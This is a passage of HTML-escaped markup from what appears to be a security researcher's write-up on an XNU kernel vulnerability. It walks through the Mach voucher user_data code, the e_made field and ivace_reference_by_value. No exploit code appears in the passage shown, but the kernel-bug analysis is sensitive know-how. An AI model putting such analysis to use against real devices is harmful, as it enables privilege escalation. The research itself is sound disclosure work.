class="BGLtzooHlW-c4"&gt;alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;goto&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;retry&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_enter&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_bucket&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;],&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;e_hash_link&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;attributes are just uniquified buffer pointers. Each buffer is represented by a &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;structure, which has a meta-data header followed by a variable-sized inline buffer containing the arbitrary byte data:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3f4fc041af984f11d98fc5aca7a145c07ded181d"&gt;&lt;/a&gt;&lt;a id="t.29"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;user_data_value_element &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_reference_t &amp;nbsp; &amp;nbsp; e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_sum&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_chain_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_hash_link&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint8_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Pointers to those elements are stored in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_bucket&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;hash table.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;searches the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_bucket&lt;/span&gt;&lt;span&gt;&amp;nbsp;hash table to see if a matching &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;already exists. If not, it allocates one and adds it to the hash table. Note that it&amp;#39;s not allowed to hold locks while calling &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;kalloc()&lt;/span&gt;&lt;span&gt;&amp;nbsp;so the code first has to drop the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock, allocate a &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;then take the lock again and check the hash table a second time to ensure that another thread didn&amp;#39;t also allocate and insert a matching &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;while the lock was dropped.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;is critical to the vulnerability we&amp;#39;re eventually going to discuss, so let&amp;#39;s examine its use here.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;If a new &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is created its &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is initialized to 1. If an existing &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is found which matches the requested content buffer the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is incremented before a pointer to that &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is returned. Redeeming a &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;(via the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;command) also just increments the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the element being redeemed before returning it. The type of the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;mach_voucher_attr_value_reference_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;so it&amp;#39;s tempting to believe that this field is a reference count. The reality is more subtle than that though.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The first hint that &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t exactly a reference count is that if you search for &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;in XNU you&amp;#39;ll notice that it&amp;#39;s never decremented. There are also no places where a pointer to that structure is cast to another type which treats the first dword as a reference count. &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;can only ever go up (well technically there&amp;#39;s also nothing stopping it overflowing so it can also go down 1 in every 2&lt;/span&gt;&lt;span class="BGLtzooHlW-c28"&gt;32&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;increments...)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Let&amp;#39;s go back up the stack to the caller of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_get_value&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The next part is again code for unused functionality. No current voucher attr type implementations return a &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;new_value_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;so this condition is never true:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.4f6b8727516fb3c9c48ebff520ad8874f31f22d6"&gt;&lt;/a&gt;&lt;a id="t.30"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* TODO: value insertion from returned voucher */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;IV_NULL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;new_value_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_value_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Next, the code needs to wrap &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;new_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;in an &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;and determine the index of that &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the controller&amp;#39;s table of values. This is done by &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_reference_by_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.c4c5981b6f20ec9de21a50072140d8a412c4cbbe"&gt;&lt;/a&gt;&lt;a id="t.31"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Find or create a slot in the table associated&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* with this attribute value. &amp;nbsp;The ivac reference&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* is transferred to a new value, or consumed if&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* we find a matching existing value.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; val_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace_reference_by_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;new_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;new_flag&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_set&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;val_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.14867f48cf979ee62c6fdccbefa3859e7dda3ebe"&gt;&lt;/a&gt;&lt;a id="t.32"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp;* Look up the values for a given &amp;lt;key, index&amp;gt; pair.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp;*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp;* Consumes a reference on the passed voucher control.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp;* Either it is donated to a newly-created value cache&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp;* or it is released (if we piggy back on an existing&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp;* value cache entry).&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;iv_index_t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_reference_by_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_control_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_flags_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;flag&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_entry_t ivace &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IVACE_NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t hash_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;IVAC_NULL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IV_UNUSED_VALINDEX&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p 